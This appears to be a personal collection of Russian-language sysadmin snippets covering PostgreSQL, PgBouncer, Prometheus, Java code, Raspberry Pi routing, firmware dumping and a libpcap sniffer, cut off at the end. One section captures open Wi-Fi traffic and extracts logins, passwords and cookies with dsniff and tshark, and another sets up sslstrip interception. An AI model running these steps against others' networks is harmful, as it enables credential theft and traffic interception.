  articles(id SERIAL PRIMARY KEY, title VARCHAR(128), content TEXT);
CREATE OR REPLACE FUNCTION make_tsvector(title TEXT, content TEXT)
   RETURNS tsvector AS $$
BEGIN
  RETURN (setweight(to_tsvector('english', title),'A') ||
    setweight(to_tsvector('english', content), 'B'));
END
$$ LANGUAGE 'plpgsql' IMMUTABLE;

CREATE INDEX IF NOT EXISTS idx_fts_articles ON articles
  USING gin(make_tsvector(title, content));

SELECT id, title FROM articles WHERE
  make_tsvector(title, content) @@ to_tsquery('bjarne <-> stroustrup');
  
SELECT id, ts_headline(title, q) FROM articles,
    to_tsquery('bjarne <-> stroustrup') AS q
  WHERE make_tsvector(title, content) @@ q;
  
SELECT id, ts_headline(title, q, 'StartSel=<em>, StopSel=</em>')
  FROM articles, to_tsquery('bjarne <-> stroustrup') AS q
  WHERE make_tsvector(title, content) @@ q
  ORDER BY ts_rank(make_tsvector(title, content), q) DESC;
==============================================================================================================
wget --quiet https://www.postgresql.org/media/keys/ACCC4CF8.asc -O - \
  | sudo apt-key add -
  
deb http://apt.postgresql.org/pub/repos/apt/ trusty-pgdg main

sudo apt-get update
sudo apt-get install postgresql-9.5

Правим /etc/postgresql/9.5/main/pg_hba.conf:

host    replication      postgres       10.0.3.0/24            md5
host    all              postgres       10.0.3.0/24            md5

Правим /etc/postgresql/9.5/main/postgresql.conf:

# какие адреса слушать, замените на IP сервера
listen_addresses = '10.0.3.245'

wal_level = hot_standby

# опционально: не дожидаемся fsync на реплике при синхронной репликации
# synchronous_commit = remote_write

# это нужно, чтобы работал pg_rewind
wal_log_hints = on

max_wal_senders = 8
wal_keep_segments = 64

# если хотим синхронную репликацию на одну любую реплику
# synchronous_standby_names = '*'

hot_standby = on

cd /var/lib/postgresql/9.5/
tar -cvzf main_backup-`date +%s`.tgz main
rm -rf main
mkdir main
chmod go-rwx main
pg_basebackup -P -R -X stream -c fast -h 10.0.3.245 -U postgres \
  -D ./main
  
recovery_target_timeline = 'latest'
recovery_min_apply_delay = 10min

/etc/postgresql/9.5/main/pg_hba.conf
/etc/postgresql/9.5/main/postgresql.conf

https://eax.me/postgresql-replication/

SELECT * FROM pg_stat_replication;

Не дожидаемся fsync на реплике:

SET synchronous_commit = 'remote_write';
Пишем только локально, не ждем подтверждения от реплики:

SET synchronous_commit = 'local';
Возвращаем обычное поведение:

SET synchronous_commit = 'on';

sudo -u postgres /usr/lib/postgresql/9.5/bin/pg_ctl promote \
  -D /var/lib/postgresql/9.5/main/
  
SELECT pg_is_in_recovery();

sudo apt-add-repository ppa:pitti/postgresql
sudo apt-get update
sudo apt-get install postgresql-9.2

https://eax.me/postgresql-install/

CREATE DATABASE test_database;
CREATE USER test_user WITH password 'qwerty';
GRANT ALL ON DATABASE test_database TO test_user;

CREATE SEQUENCE user_ids;
CREATE TABLE users (
  id INTEGER PRIMARY KEY DEFAULT NEXTVAL('user_ids'),
  login CHAR(64),
  password CHAR(64));
  
CREATE TABLE users2 (
  id SERIAL PRIMARY KEY,
  login CHAR(64),
  password CHAR(64));
  
Теперь с помощью команды \d можно ознакомиться со списком всех доступных таблиц, а с помощью \d users — увидеть описание таблицы users. Если вы не получили интересующую вас информацию, попробуйте \d+ вместо \d. Список баз данных можно получить командой \l, а переключиться на конкретную БД — командой \c dbname. Для отображения справки по командам скажите \?.

CREATE TABLE "anotherTable" ("someValue" VARCHAR(64));

CREATE SCHEMA bookings;
Переключение на схему:

SET search_path TO bookings;

Просмотреть список существующих схем можно командой \dn. По умолчанию используется схема с именем public. В принципе, можно успешно использовать PostgreSQL, и не зная про существование схем. Но при работе с унаследованным кодом, а также в некоторых граничных случаях, знание о схемах может очень пригодиться.

Чтобы исправить это, добавьте строку:

listen_addresses = 'localhost,192.168.0.1'
… в файл /etc/postgresql/9.2/main/postgresql.conf, а также:

host    all    all    192.168.0.1/16    md5
… в файл /etc/postgresql/9.2/main/pg_hba.conf и скажите:

sudo service postgresql restart

pg_dump -c -h 192.168.0.1 -U test_user test_database > ./dump.sql
cat dump.sql | psql -h 192.168.0.1 test_database test_user


sudo apt-get install pgbouncer
По умолчанию прокси слушает порт 6432. Логи можно почитать так:

less /var/log/postgresql/pgbouncer.log.
Конфигурационный файл называется /etc/pgbouncer/pgbouncer.ini. Рассмотрим основные параметры.

;; database name = connect string
;;
;; connect string params:
;;   dbname= host= port= user= password=
;;   client_encoding= datestyle= timezone=
;;   pool_size= connect_query=
;;   auth_user=
[databases]

* = host=localhost port=5432

; When server connection is released back to pool:
;   session      - after client disconnects
;   transaction  - after transaction finishes
;   statement    - after statement finishes
pool_mode = transaction
По умолчанию стоит в session, то есть, сессия будет удерживаться клиентом до тех пор, пока он не закроет соединение. Чаще всего значение имеет смысл заменить на transaction. В этом случае соединение будет возвращаться в общий пул после завершения транзакции. Значение statement означает, что соединение будет освобождаться после выполнения каждого отдельного выражения, чего вы почти наверняка не должны хотеть.

Настройки размера пула:

; total number of clients that can connect
max_client_conn = 1000

; default pool size.  20 is good number when transaction pooling
; is in use, in session pooling it needs to be the number of
; max clients you want to handle at any moment
default_pool_size = 20

;; Minimum number of server connections to keep in pool.
;min_pool_size = 0

; any, trust, plain, crypt, md5, cert, hba, pam
auth_type = md5
auth_file = /etc/pgbouncer/userlist.txt

;;;
;;; Users allowed into database 'pgbouncer'
;;;

; comma-separated list of users, who are allowed to change settings
admin_users = eax

; comma-separated list of users who are just allowed to use
;    SHOW command
;stats_users = stats, root

Файл /etc/pgbouncer/userlist.txt содержит имена пользователей и пароли, с которыми PgBouncer подключается к базе. Например:

"eax" "qwerty"
Пароли не обязательно хранить открытым текстом:

"eax" "md5175c641eaed0b6c05ae8444b73d789f0"
Здесь хэш 175c641e... был посчитан как MD5 от пароля, следом за которым записано имя пользователя:

echo -n 'qwertyeax' | md5sum
Теперь, когда PgBouncer настроен, можно перезапустить его:

sudo service pgbouncer restart
… и ломиться в базу:

psql -p 6432 -U eaxRELOAD;
Информацию о других доступных командах можно посмотреть так:

SHOW HELP;

pgbench -i
pgbench -p 6432 -c 900 -C -T 60 -P 1
Если все было сделано правильно, pgbench будет превосходно работать, а команда SHOW CLIENTS;, выполненная в админке PgBouncer, покажет нам 900 соединений. При этом вывод ps wuax | grep postgres покажет, что реально запущено лишь 20 бэкендов PostgreSQL.
==============================================================================================================
Итак, на всех трех машинах собираем Stolon из исходников:

cd ~/go/src # или где у вас $GOPATH/src
mkdir -p github.com/sorintlab
cd github.com/sorintlab
git clone https://github.com/sorintlab/stolon.git
cd stolon
git checkout v0.3.0
./build
Запускаем sentinel:

./bin/stolon-sentinel --cluster-name mycluster --store-backend consul \
  --listen-address 10.0.3.7
Задача sentinel — следить за состоянием кластера и в случае необходимости производить его реконфигурацию. Одновременно можно запустить сколько угодно sentinel, но из них только один будет выбран, как лидер. Остальные нужны для того, чтобы заменить лидера, если с ним что-то случится. В общем случае, чтобы нормально переживать нетсплиты, следует запускать по одному sentinel на каждой машине с PostgreSQL.

https://eax.me/stolon/

curl -s 'localhost:8500/v1/kv/?recurse' | jq -r '.[]["Key"]'
https://github.com/sorintlab/stolon


Можете немного поэкспериментировать с MongoDB, поработав с ней через оболочку mongo:

$ mongo MongoShortener
MongoDB shell version: 2.0.6
connecting to: MongoShortener
Смотрим список коллекций в базе:

> show collections
Создать новый документ (попробуйте создать два документа с одинаковым code):

> db.urls.insert({ code: 123, url: "http://eax.me/" });
Просмотреть список документов (в поле _id всегда хранится уникальный ID документа):

> db.urls.find();
Создание индекса:

> db.urls.ensureIndex({ code: 1 }, { unique: true });
Просмотр списка индексов:

> db.urls.getIndexes();
Удаление индекса (перезапустите сокращалку и посмотрите, создастся ли он снова):

> db.urls.dropIndex({ code: 1 });
Обновление документа:

> db.urls.update({ code: 123 }, { url: "http://example.ru/" });
Удаление документа:

> db.urls.remove({ code: 123 });
Выход из оболочки:

> exit


https://eax.me/couchdb/
curl -X GET http://localhost:5984/_membership

curl -X PUT http://localhost:5984/_users/org.couchdb.user:afiskon \
     -H "Accept: application/json" \
     -H "Content-Type: application/json" \
     -d '{"name": "afiskon", "password": "secret", "roles": [],'\
' "type": "user"}'

curl -X PUT \
  http://localhost:5984/contacts/_security \
  -H "Content-Type: application/json" \
  -d '{"admins": { "names": [], "roles": [] }, "members": '\
'{ "names": ["afiskon"], "roles": [] } }' \
  --user admin
==============================================================================================================
@startlatex
\sum_{i=1}^n i^3=\bigg ({\dfrac{n(n+1)}{2}} \bigg)^2
@endlatex
==============================================================================================================
;(function()
{
	// CommonJS
	SyntaxHighlighter = SyntaxHighlighter || (typeof require !== 'undefined'? require('shCore').SyntaxHighlighter : null);

	function Brush()
	{
		var keywords =	'break case catch class continue ' +
				'default delete do else enum export extends false  ' +
				'for function if implements import in instanceof ' +
				'interface let new null package private protected ' +
				'static return super switch ' +
				'this throw true try typeof var while with yield';

		var r = SyntaxHighlighter.regexLib;

		this.regexList = [
			{ regex: r.multiLineDoubleQuotedString,					css: 'string' },			// double quoted strings
			{ regex: r.multiLineSingleQuotedString,					css: 'string' },			// single quoted strings
			{ regex: r.singleLineCComments,							css: 'comments' },			// one line comments
			{ regex: r.multiLineCComments,							css: 'comments' },			// multiline comments
			{ regex: /\s*#.*/gm,									css: 'preprocessor' },		// preprocessor tags like #region and #endregion
			{ regex: new RegExp(this.getKeywords(keywords), 'gm'),	css: 'keyword' }			// keywords
			];

		this.forHtmlScript(r.scriptScriptTags);
	};

	Brush.prototype	= new SyntaxHighlighter.Highlighter();
	Brush.aliases	= ['js', 'jscript', 'javascript'];

	SyntaxHighlighter.brushes.JScript = Brush;

	// CommonJS
	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
})();

/* global describe, it */

(function () {
    'use strict';

    describe('Give it some context', function () {
        describe('maybe a bit more context here', function () {
            it('should run here few assertions', function () {

            });
        });
    });
})();
==============================================================================================================
git remote add NAME URL >/dev/null 2>&1 || git remote set-url NAME URL
git push --set-upstream origin master
==============================================================================================================
==============================================================================================================
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.cache.annotation.CacheEvict;
import org.springframework.cache.annotation.Cacheable;
import org.springframework.stereotype.Service;
import org.springframework.util.Assert;
import ru.javawebinar.topjava.model.User;
import ru.javawebinar.topjava.repository.UserRepository;
import ru.javawebinar.topjava.util.exception.NotFoundException;

import java.util.List;

import static ru.javawebinar.topjava.util.ValidationUtil.checkNotFound;
import static ru.javawebinar.topjava.util.ValidationUtil.checkNotFoundWithId;

/**
 * GKislin
 * 06.03.2015.
 */
@Service
public class UserServiceImpl implements UserService {

    @Autowired
    private UserRepository repository;

    @CacheEvict(value = "users", allEntries = true)
    @Override
    public User save(User user) {
        Assert.notNull(user, "user must not be null");
        return repository.save(user);
    }

    @CacheEvict(value = "users", allEntries = true)
    @Override
    public void delete(int id) {
        checkNotFoundWithId(repository.delete(id), id);
    }

    @Override
    public User get(int id) throws NotFoundException {
        return checkNotFoundWithId(repository.get(id), id);
    }

    @Override
    public User getByEmail(String email) throws NotFoundException {
        Assert.notNull(email, "email must not be null");
        return checkNotFound(repository.getByEmail(email), "email=" + email);
    }

    @Cacheable("users")
    @Override
    public List<User> getAll() {
        return repository.getAll();
    }

    @CacheEvict(value = "users", allEntries = true)
    @Override
    public void update(User user) {
        Assert.notNull(user, "user must not be null");
        repository.save(user);
    }

    @CacheEvict(value = "users", allEntries = true)
    @Override
    public void evictCache() {
    }
}

@Access(AccessType.FIELD)

 @Id
    @SequenceGenerator(name = "global_seq", sequenceName = "global_seq", allocationSize = 1)
    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "global_seq")
    // PROPERTY access for id due to bug: https://hibernate.atlassian.net/browse/HHH-3718
    @Access(value = AccessType.PROPERTY)
    protected Integer id;
	
	
import org.hibernate.validator.constraints.NotBlank;
import org.hibernate.validator.constraints.Range;

import javax.persistence.*;
import javax.validation.constraints.NotNull;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.LocalTime;

/**
 * GKislin
 * 11.01.2015.
 */
@SuppressWarnings("JpaQlInspection")
@NamedQueries({
        @NamedQuery(name = Meal.ALL_SORTED, query = "SELECT m FROM Meal m WHERE m.user.id=:userId ORDER BY m.dateTime DESC"),
        @NamedQuery(name = Meal.DELETE, query = "DELETE FROM Meal m WHERE m.id=:id AND m.user.id=:userId"),
        @NamedQuery(name = Meal.GET_BETWEEN, query = "SELECT m FROM Meal m " +
                "WHERE m.user.id=:userId AND m.dateTime BETWEEN :startDate AND :endDate ORDER BY m.dateTime DESC"),
//        @NamedQuery(name = Meal.UPDATE, query = "UPDATE Meal m SET m.dateTime = :datetime, m.calories= :calories," +
//                "m.description=:desc where m.id=:id and m.user.id=:userId")
})
@Entity
@Table(name = "meals", uniqueConstraints = {@UniqueConstraint(columnNames = {"user_id", "date_time"}, name = "meals_unique_user_datetime_idx")})
public class Meal extends BaseEntity {
    public static final String ALL_SORTED = "Meal.getAll";
    public static final String DELETE = "Meal.delete";
    public static final String GET_BETWEEN = "Meal.getBetween";

    @Column(name = "date_time", nullable = false)
    @NotNull
    private LocalDateTime dateTime;

    @Column(name = "description", nullable = false)
    @NotBlank
    private String description;

    @Column(name = "calories", nullable = false)
    @Range(min = 10, max = 5000)
    private int calories;

    @ManyToOne(fetch = FetchType.LAZY)
    @JoinColumn(name = "user_id", nullable = false)
    private User user;

    public Meal() {
    }

    public Meal(LocalDateTime dateTime, String description, int calories) {
        this(null, dateTime, description, calories);
    }

    public Meal(Integer id, LocalDateTime dateTime, String description, int calories) {
        super(id);
        this.dateTime = dateTime;
        this.description = description;
        this.calories = calories;
    }

    public LocalDateTime getDateTime() {
        return dateTime;
    }

    public String getDescription() {
        return description;
    }

    public int getCalories() {
        return calories;
    }

    public LocalDate getDate() {
        return dateTime.toLocalDate();
    }

    public LocalTime getTime() {
        return dateTime.toLocalTime();
    }

    public void setDateTime(LocalDateTime dateTime) {
        this.dateTime = dateTime;
    }

    public void setDescription(String description) {
        this.description = description;
    }

    public void setCalories(int calories) {
        this.calories = calories;
    }

    public User getUser() {
        return user;
    }

    public void setUser(User user) {
        this.user = user;
    }

    @Override
    public String toString() {
        return "Meal{" +
                "id=" + id +
                ", dateTime=" + dateTime +
                ", description='" + description + '\'' +
                ", calories=" + calories +
                '}';
    }
}


==============================================================================================================
wget --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie" "http://download.oracle.com/otn-pub/java/jdk/8u51-b16/jdk-8u51-linux-i586.tar.gz"
tar xzvf jdk-8u51-linux-i586.tar.gz
jdk1.8.0_51/bin/java -jar blink-1.0-SNAPSHOT.jar
==============================================================================================================
<dependencies>
  <dependency>
    <groupId>com.basho.riak</groupId>
    <artifactId>riak-client</artifactId>
    <version>2.0.7</version>
  </dependency>
  ...
</dependencies>
==============================================================================================================
sudo systemctl restart prometheus
==============================================================================================================
sudo useradd --no-create-home --shell /bin/false node_exporter
# Последнюю версию пакета ищем здесь:
# https://github.com/prometheus/node_exporter/releases
wget https://github.com/.../node_exporter-0.17.0.linux-amd64.tar.gz
tar -xvzf node_exporter-0.17.0.linux-amd64.tar.gz
sudo cp node_exporter-0.17.0.linux-amd64/node_exporter /usr/local/bin/

Создаем /etc/systemd/system/node_exporter.service:

[Unit]
Description=Node Exporter
Wants=network-online.target
After=network-online.target

[Service]
User=node_exporter
Group=node_exporter
ExecStart=/usr/local/bin/node_exporter

[Install]
WantedBy=default.target
Запускаем демона:

sudo systemctl daemon-reload
sudo systemctl start node_exporter
sudo systemctl status node_exporter
sudo systemctl enable node_exporter
Проверяем, что метрики отдаются:

curl 'localhost:9100/metrics'

sudo useradd --no-create-home --shell /bin/false prometheus
# Свежий пакет находим здесь:
# https://github.com/prometheus/prometheus/releases
wget https://github.com/.../prometheus-2.6.0.linux-amd64.tar.gz
tar -xvzf prometheus-2.6.0.linux-amd64.tar.gz
sudo cp prometheus-2.6.0.linux-amd64/prometheus /usr/local/bin/
sudo cp prometheus-2.6.0.linux-amd64/promtool /usr/local/bin/

sudo mkdir /etc/prometheus
sudo cp -r prometheus-2.6.0.linux-amd64/consoles/ \
  /etc/prometheus/consoles
sudo cp -r prometheus-2.6.0.linux-amd64/console_libraries/ \
  /etc/prometheus/console_libraries
sudo cp prometheus-2.6.0.linux-amd64/prometheus.yml \
  /etc/prometheus/
sudo chown -R prometheus:prometheus /etc/prometheus

sudo mkdir /var/lib/prometheus
sudo chown prometheus:prometheus /var/lib/prometheus


Правим /etc/prometheus/prometheus.yml, указывая, где искать Node Exporter:

# ...

# Важно! В YAML запрещено использовать табуляцию.
# Все отступы - это два пробела.

scrape_configs:
  - job_name: 'prometheus'
    # ... тут все оставляем как было ...
  - job_name: 'node_localhost'
    static_configs:
    - targets: ['localhost:9100']
Создаем /etc/systemd/system/prometheus.service:

[Unit]
Description=Prometheus
Wants=network-online.target
After=network-online.target

[Service]
User=prometheus
Group=prometheus
ExecStart=/usr/local/bin/prometheus \
    --config.file /etc/prometheus/prometheus.yml \
    --storage.tsdb.path /var/lib/prometheus/ \
    --web.console.templates=/etc/prometheus/consoles \
    --web.console.libraries=/etc/prometheus/console_libraries

[Install]
WantedBy=default.target
Запускаем Prometheus:

sudo systemctl daemon-reload
sudo systemctl start prometheus
sudo systemctl status prometheus
sudo systemctl enable prometheus
Проверяем, что Prometheus отдает свои собственные метрики:

curl 'localhost:9090/metrics'


# Ссылку на свежий пакет находим тут:
# https://grafana.com/grafana/download

wget https://dl.grafana.com/oss/release/grafana_5.4.2_amd64.deb
sudo apt install ./grafana_5.4.2_amd64.deb
sudo systemctl start grafana-server
sudo systemctl status grafana-server
sudo systemctl enable grafana-server
==============================================================================================================
Первым делом, переводим донгл в monitor mode:

sudo airmon-ng start wlp0s20u1
Посмотрим, какой канал использует интересующий наш роутер:

sudo airodump-ng wlp0s20u1mon
В моем случае использовался 8-ой канал. Снифаем весь трафик:

sudo airodump-ng -c 8 -w wifi-traffic wlp0s20u1mon
Поскольку трафик передается в открытом виде, не составляет большого труда проанализировать его:

# грепаем строки
strings wifi-traffic-01.cap | grep http

# выводим все логины-пароли
dsniff -p wifi-traffic-01.cap

# выводим все URL
urlsnarf -p wifi-traffic-01.cap

# почему-то tshark находит намного больше URL
tcpdump -r wifi-traffic-01.cap -n -w - tcp port 80 | \
  tshark -V -Y "http.request || http.response" -r - | \
  grep 'Full request URI'

# также через tshark видны все куки и формы
tcpdump -r wifi-traffic-01.cap -n -w - tcp port 80 | \
  tshark -V -Y "http.request || http.response" -r -
==============================================================================================================
sudo apt install sslstrip
sslstrip -l 8080
В соседнем терминале говорим:

sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 \
  -j REDIRECT --to-port 8080
==============================================================================================================
https://eax.me/lets-encrypt/

sudo add-apt-repository ppa:certbot/certbot
sudo apt-get update
sudo apt-get install python3-certbot-nginx

sudo service nginx reload
… и просим Certbot получить сертификат:

sudo certbot --nginx -d afiskon.ru
sudo certbot renew --dry-run

https://www.rtl-sdr.com/
http://gqrx.dk/download/gqrx-sdr-for-the-raspberry-pi
==============================================================================================================
passwd
sudo systemctl enable ssh.service
sudo systemctl start ssh.service


Первоначальная настройка NAT
Открываем /etc/network/interfaces и пишем туда следующее:

auto lo
iface lo inet loopback

auto eth0

# Вариант А, без смены MAC:
# iface eth0 inet dhcp

# Вариант Б, со сменой MAC:
iface eth0 inet dhcp
  hwaddress ether 11:22:33:44:55:66

auto eth1
iface eth1 inet static
  address 10.128.10.1
  network 10.128.10.0
  netmask 255.255.255.0
  broadcast 10.128.10.255

auto wlan0
iface wlan0 inet static
  address 10.128.11.1
  network 10.128.11.0
  netmask 255.255.255.0
  broadcast 10.128.11.255
  
  
sudo systemctl stop dhcpcd
sudo systemctl disable dhcpcd

sudo systemctl restart networking
sudo apt install dnsmasq dnsutils

Правим /etc/dnsmasq.conf:

# Можно явно указать апстрим DNS-сервера
# Это может быть особенно полезно, если вы
# хотите заворачивать весь трафик в VPN
server=8.8.8.8
server=8.8.4.4

domain-needed
bogus-priv

# Listen only given interfaces
interface=lo
interface=eth1
interface=wlan0
bind-interfaces

# DNS cache size
cache-size=15000

# IP ranges
dhcp-range=eth1,10.128.10.50,10.128.10.250
dhcp-range=wlan0,10.128.11.50,10.128.11.250

# Default gateways
dhcp-option=eth1,3,10.128.10.1
dhcp-option=wlan0,3,10.128.11.1

# DNS servers
dhcp-option=eth1,6,10.128.10.1
dhcp-option=wlan0,6,10.128.11.1
Перезапускаем демона:

sudo systemctl restart dnsmasq
sudo systemctl status dnsmasq
Проверяем работу DNS-сервера:

dig @127.0.0.1 eax.me


# enable IP-forwarding
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'

# for LAN
sudo iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o eth1 -m conntrack \
  --ctstate ESTABLISHED,RELATED -j ACCEPT

# for WLAN
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -m conntrack \
  --ctstate ESTABLISHED,RELATED -j ACCEPT

# allow traffic between LAN and WLAN
sudo iptables -A FORWARD -i wlan0 -o eth1 -j ACCEPT
sudo iptables -A FORWARD -i eth1 -o wlan0 -j ACCEPT

sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

выдали IP-адрес, и что имеется доступ в интернет. Если все работает, сохраняем сделанные изменения, чтобы они не потерялись после перезагрузки.

Для этого дописываем в /etc/sysctl.conf:

net.ipv4.ip_forward=1
Выполняем: команду:

sudo sh -c 'iptables-save > /etc/iptables.rules'
Создаем скрипт /etc/network/if-pre-up.d/iptables:

#!/bin/sh

set -e

iptables-restore < /etc/iptables.rules
exit 0
Говорим:

sudo chmod +x /etc/network/if-pre-up.d/iptables
Перезагружаем малину:

sudo reboot
Проверяем, что все работает и после перезагрузки.

Настройка точки доступа Wi-Fi
Устанавливаем hostapd:

sudo apt install hostapd
Правим /etc/default/hostapd

DAEMON_CONF="/etc/hostapd/hostapd.conf"
Создаем файл /etc/hostapd/hostapd.conf:

interface=wlan0
ssid=RaspberryPi
country_code=RU

# Enable IEEE 802.11d
ieee80211d=1

# Enable IEEE 802.11n
ieee80211n=1

hw_mode=g
channel=5

# Use PSK
auth_algs=1

wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=s3cre7_pa55w0rd
SSID, пароль и номер канала, естественно, указываем какие нужно.

Запускаем hostapd:

sudo systemctl enable hostapd
sudo systemctl start hostapd
Должна появиться точка доступа с SSID RaspberryPi. Пробуем к ней подключиться и проверяем, что все работает. Если вдруг что-то не работает, отладочный вывод можно получить командой:

sudo hostapd -dd /etc/hostapd/hostapd.conf
Делаем ребут:

sudo reboot
==============================================================================================================
gdb -> disassemble

omxplayer test.mp3
==============================================================================================================
nmap -Pn -p 22 192.168.0.0/24 | grep -B3 open | grep 'Nmap scan'
Затем подключаем малину, повторяем команду, смотрим diff.

==============================================================================================================
wget http://download.raspbsd.org/FreeBSD-armv6-11.0-RPI2-291824.img.gz
gunzip FreeBSD-armv6-11.0-RPI2-291824.img.gz
sudo umount /dev/mmcblk0p1
sudo dd bs=1M if=FreeBSD-armv6-11.0-RPI2-291824.img of=/dev/mmcblk0

http://www.sstv-handbook.com/

FlightAware
APRSdroid
https://aprs.fi/info/a/R1BEN-9
https://github.com/MalcolmRobb/dump1090
https://eax.me/weather-satellites/

opkg install kmod-i2c-gpio-custom kmod-i2c-core i2c-tools
cat /sys/class/gpio/gpio0/value
echo 0 > /sys/class/gpio/export

flashrom -c 'MX25L12835F/MX25L12845E/MX25L12865E' \
  -p 'ft2232_spi:type=2232H,port=A' --read gl-ar750.dump

sudo yaourt -S binwalk-git squashfs-tools sasquatch jefferson-git \
  mtd-utils gzip bzip2 tar arj lhasa p7zip cabextract sleuthkit lzop
binwalk gl-ar750.dump
binwalk -e gl-ar750.dump
r2 -a mips -b 32 _gl-ar750.dump.extracted/squashfs-root/bin/busybox
==============================================================================================================
#!/usr/bin/env python3
# vim: set ai et ts=4 sw=4:

import os
import sys
import subprocess
import tempfile

def run(cmd):
    code = subprocess.call(cmd, shell=True)
    if code != 0:
        print("Command `%s` returned non-zero status: %d" %
              (cmd, code))
        sys.exit(1)

if len(sys.argv) < 2:
    print("Usage: " + sys.argv[0] + " <infile>")
    sys.exit(1)

infile = sys.argv[1]
outfile = tempfile.gettempdir() + "/temp.pgm";
fsize = os.path.getsize(infile)

run('(echo "P5 512 %d 255"; cat %s) > %s' %
    (fsize / 512, infile, outfile))
run('gimp %s' % (outfile))
==============================================================================================================
msg:
  .ascii "hello world"

foo:
  push msg
  call print
  jmp foo
  
  
https://eax.me/sigrok/
https://github.com/ReFirmLabs/binwalk  
==============================================================================================================
yaourt -S radare2-cutter-git

# по умолчанию файл открывается только на чтение:
r2 ~/path/to/binary
# для открытия на чтение и на запись скажите:
# r2 -w ~/path/to/binary

https://eax.me/radare2/
https://crafting.be/2017/04/radare2-reverse-unknown/

sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev
==============================================================================================================
sudo ip link set enp0s25 promisc on
sudo ip link set enp0s20u3 promisc on

==============================================================================================================
sudo ethtool -s enp0s25 speed 10 autoneg off
ethtool enp0s25
od -Ax -tx1 -v payload.dat > payload.hex

==============================================================================================================
/*
 * eaxsniff - libpcap usage example
 * (c) Aleksander Alekseev 2016 | http://eax.me/
 */

#include <pcap/pcap.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "include/net_headers.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define UNUSED(x) ((void)(x))

#define PRINT_BYTES_PER_LINE 16

static void
print_data_hex(const uint8_t* data, int size)
{
    int offset = 0;
    int nlines = size / PRINT_BYTES_PER_LINE;
    if(nlines * PRINT_BYTES_PER_LINE < size)
        nlines++;

    printf("        ");

    for(int i = 0; i < PRINT_BYTES_PER_LINE; i++)
        printf("%02X ", i);

    printf("\n\n");

    for(int line = 0; line < nlines; line++)
    {
        printf("%04X    ", offset);
        for(int j = 0; j < PRINT_BYTES_PER_LINE; j++)
        {
            if(offset + j >= size)
                printf("   ");
            else
                printf("%02X ", data[offset + j]);
        }

        printf("   ");

        for(int j = 0; j < PRINT_BYTES_PER_LINE; j++)
        {
            if(offset + j >= size)
                printf(" ");
            else if(data[offset + j] > 31 && data[offset + j] < 127)
                printf("%c", data[offset + j]);
            else
                printf(".");
        }

        offset += PRINT_BYTES_PER_LINE;
        printf("\n");
    }
}

static void
handle_packet(uint8_t* user, const struct pcap_pkthdr *hdr,
                const uint8_t* bytes)
{
    UNUSED(user);

    struct iphdr* ip_header = (struct iphdr*)(bytes +
                                              sizeof(struct ethhdr));
    struct sockaddr_in  source, dest;

    memset(&source, 0, sizeof(source));
    memset(&dest, 0, sizeof(dest));
    source.sin_addr.s_addr = ip_header->saddr;
    dest.sin_addr.s_addr = ip_header->daddr;

    char source_ip[128];
    char dest_ip[128];
    strncpy(source_ip, inet_ntoa(source.sin_addr), sizeof(source_ip));
    strncpy(dest_ip, inet_ntoa(dest.sin_addr), sizeof(dest_ip));

    int source_port = 0;
    int dest_port = 0;
    int data_size = 0;
    int ip_header_size = ip_header->ihl * 4;
    char* next_header = (char*)ip_header + ip_header_size;

    if(ip_header->protocol == IP_HEADER_PROTOCOL_TCP)
    {
        struct tcphdr* tcp_header = (struct tcphdr*)next_header;
        source_port = ntohs(tcp_header->source);
        dest_port = ntohs(tcp_header->dest);
        int tcp_header_size = tcp_header->doff * 4;
        data_size = hdr->len - sizeof(struct ethhdr) -
                        ip_header_size - tcp_header_size;
    }
    else if(ip_header->protocol == IP_HEADER_PROTOCOL_UDP)
    {
        struct udphdr* udp_header = (struct udphdr*)next_header;
        source_port = ntohs(udp_header->source);
        dest_port = ntohs(udp_header->dest);
        data_size = hdr->len - sizeof(struct ethhdr) -
                        ip_header_size - sizeof(struct udphdr);
    }

    printf("\n%s:%d -> %s:%d, %d (0x%x) bytes\n\n",
        source_ip, source_port, dest_ip, dest_port,
        data_size, data_size);

    if(data_size > 0)
    {
        int headers_size = hdr->len - data_size;
        print_data_hex(bytes + headers_size, data_size);
    }
}

void
list_devs()
{
    int errcode;
    pcap_if_t *alldevs, *currdev;
    char errbuff[PCAP_ERRBUF_SIZE];

    errcode = pcap_findalldevs(&alldevs, errbuff);
    if(errcode != 0)
    {
        fprintf(stderr, "pcap_findalldevs failed: %s\n", errbuff);
        return;
    }

    currdev = alldevs;

    while(currdev)
    {
        printf("%s\t%s\n", currdev->name,
            currdev->description ? currdev->description :
                                   "(no description)"
        );
        currdev = currdev->next;
    }

    if(alldevs)
        pcap_freealldevs(alldevs);
}

int
main(int argc, char* argv[])
{
    int res;

    if((argc < 3) && !((argc == 2) &&
                       (strcmp(argv[1], "--list-devs") == 0)))
    {
        printf("Usage: %s device filter\n"
               "       %s --list-devs\n",
               argv[0], argv[0]);
        printf("Example: %s eth0 'udp src or dst port 53'\n", argv[0]);
        printf("%s\n", pcap_lib_version());
        return 1;
    }

    if(argc == 2)
    {
        list_devs();
        return 0;
    }

    const char* device = argv[1];
    const char* filter = argv[2];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* pcap = pcap_open_live(device, 65535, 1, 100, errbuf);
    if(pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        return 1;
    }

    struct bpf_program filterprog;
    res = pcap_compile(pcap, &filterprog, filter, 0,
                       PCAP_NETMASK_UNKNOWN);
    if(res != 0)
    {
        fprintf(stderr, "pcap_compile failed: %s\n",
                pcap_geterr(pcap));
        pcap_close(pcap);
        return 1;
    }

